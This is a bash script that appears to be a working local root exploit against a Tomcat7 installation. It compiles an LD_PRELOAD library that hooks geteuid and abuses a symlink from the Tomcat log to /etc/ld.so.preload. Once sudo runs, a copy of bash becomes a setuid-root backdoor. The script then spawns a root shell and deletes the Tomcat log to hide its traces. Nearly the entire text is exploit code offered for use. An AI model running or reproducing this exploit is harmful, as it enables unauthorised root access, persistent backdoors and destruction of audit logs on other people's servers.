#!/bin/bash
BACKDOORSH="/bin/bash"
BACKDOORPATH="/tmp/tomcatrootsh"
EXPLOITLIB="/tmp/exploit.so"
EXPLOITSRC="/tmp/exploit.c"
SUIDBIN="/usr/bin/sudo"
TOMCATLOG="/var/log/tomcat7/catalina.out"

function cleanexit {
	rm -f $EXPLOITSRC
	rm -f $EXPLOITLIB
	rm -f $TOMCATLOG
	touch $TOMCATLOG
	if [ -f /etc/ld.so.preload ]; then
		echo -n > /etc/ld.so.preload 2>/dev/null
	fi
	echo -e "\n exit root shell! \n"
	exit $1
}



# check the current user, which must be Tomcat7.
id | grep -q tomcat7
if [ $? -ne 0 ]; then
	echo -e "We need to attack as tomcat7!"
	exit 3
fi
cat <<_solibeof_>$EXPLOITSRC
#define _GNU_SOURCE
#include <stdio.h>
#include <sys/stat.h>
#include <unistd.h>
#include <dlfcn.h>
uid_t geteuid(void) {
	static uid_t  (*old_geteuid)();
	old_geteuid = dlsym(RTLD_NEXT, "geteuid");
	if ( old_geteuid() == 0 ) {
		chown("$BACKDOORPATH", 0, 0);
		chmod("$BACKDOORPATH", 04777);
		unlink("/etc/ld.so.preload");
	}
	return old_geteuid();
}
_solibeof_
gcc -Wall -fPIC -shared -o $EXPLOITLIB $EXPLOITSRC -ldl

cp $BACKDOORSH $BACKDOORPATH

# Symlink the log file to ld.so.preload
rm -f $TOMCATLOG && ln -s /etc/ld.so.preload $TOMCATLOG

# Wait for Tomcat to re-open the logs
echo -e "\n Now we need to wait the tomcat7 server to restart"
while :; do 
	sleep 0.5
	if [ -f /etc/ld.so.preload ]; then
		echo $EXPLOITLIB > /etc/ld.so.preload
		break;
	fi
done
sudo -h 2>/dev/null >/dev/null

$BACKDOORPATH -p -c "rm -f /etc/ld.so.preload; rm -f $EXPLOITLIB"
$BACKDOORPATH -p

# Job done.
cleanexit 0